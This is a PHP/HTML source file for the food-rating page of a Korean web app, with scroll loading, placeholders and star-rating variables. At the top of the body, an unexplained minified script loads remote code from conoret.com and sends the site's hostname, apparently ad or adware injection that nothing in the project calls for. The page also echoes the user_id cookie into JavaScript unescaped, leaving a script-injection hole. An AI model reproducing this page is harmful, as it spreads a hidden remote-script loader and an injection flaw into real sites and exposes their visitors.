<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
    <head>
        <?php
        include 'script/modules/TitleHandler.php';
        (TitleHandler::factory())->create('음식 평가하기');
        ?>
        
        <style>
            @font-face { /* 애플산돌고딕 폰트 적용 */
                font-family: "Jua";
                src: url("css/font/Jua-Regular.ttf") format("truetype");
                font-weight: normal;
            }
        </style>
        <link rel="stylesheet" href="/css/rating.css">
        <link rel="stylesheet" href="/css/footer.css">
        <link rel="stylesheet" href="/css/header.css">

        <script
                src="https://code.jquery.com/jquery-3.6.0.min.js"
                integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
                crossorigin="anonymous"></script>
        <script type="text/javascript">
            let mql = window.matchMedia("screen and (max-width: 768px)");
            let flag=false;
            let traits={};
            let trait_keys=null

            let ratings=null
            let unrating={}
            let unrating_keys=null
            let unrating_dict={}
            mql.addListener(function(e) {
                if(e.matches) {
                    // 모바일
                    flag=true;
                    document.getElementById('rating').classList.remove('justify-content-center')
                    document.getElementById('food-info').style.cssText=`width: 100%; height: 100%; display:none;`
                } else {
                    // 데스크탑
                    flag=false
                    document.getElementById('rating').classList.add('justify-content-center')
                    document.getElementById('food-info').style.cssText=`width: 100%; height: 100%;`
                }
            });
            let rating_placeHolder=`
            <div class="rating-placeholders">
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div style="display: inline-block; margin: 0;" class="food-image">
                            <img src="/src/food_placeholder.png" height="60" width="60">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                <span class="placeholder col-5"></span>
                            </div>
                            <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                <span class="placeholder col-10 placeholder-lg"></span>
                            </div>
                        </div>
                    </div>
                </div>
            `
            let loading=`
            <div id="loading" style="height: 140px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true" onclick="read_more();">
                <div style="display: inline-block; margin: auto;">
                    <img src="/src/loading.gif" height="90" width="90">
                </div>
            </div>
            `
            let rating_list={}
            let rating_form=``
            let rating_dict={}
            let src=null;
            let rating_info=null;
            let keys=null;
            let rating_info_json={};
            let foods={}
            let before_left='/src/rate_star_before.png';
            let before_right='/src/rate_star_before.png';
            let after_left='/src/rate_star_after.png';
            let after_right='/src/rate_star_after.png';
            let score=-1;

            let id = <?php echo $_COOKIE['user_id']?>

            let ratingIdx=0
            let lim=0

            let userProfile={}
            userProfile.userId=<?php echo $_COOKIE['user_id']; ?>
        </script>
        <script type="text/javascript" src="/script/javascript/modules.js"></script>
        <script type="text/javascript" src="/script/javascript/rating.js"></script>
    </head>

    <body class="text-center vsc-initialized" cz-shortcut-listen="true">
        <script type="text/javascript">
            window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
        </script>
    <div class="cover-container d-flex h-100 p-3 mx-auto flex-column" style="">
        <?php (LayoutHandler::factory())->createHeader(); ?>

        <main role="main" class="inner cover d-flex" id="rating">
            <script>
                let lock=false
                $(async function () {
                    console.log($('#scroll_layout').height())
                    $('#scroll_layout').scroll(function() {
                        if($('#scroll_layout').scrollTop() + $('main').height() >= $('#scroll_layout').prop('scrollHeight')) {
                            read_more()
                        }
                    });
                })
            </script>
            <div class="card p-3 bg-light" id="scroll_layout">

            </div>
            <div class="card" id='food-info'>
                <div class="card-body" id="title">
                    <img id="food-info-image" src="/src/food_placeholder.png"/>
                    <h1 class="card-title" id="food-name">음식 이름</h1>
                </div>
            </div>
            <script>
                document.getElementById('scroll_layout').innerHTML=rating_placeHolder
            </script>
        </main>

        <?php (LayoutHandler::factory())->createFooter(); ?>
    </div>
        <script>
            init()
        </script>
  </body>
</html>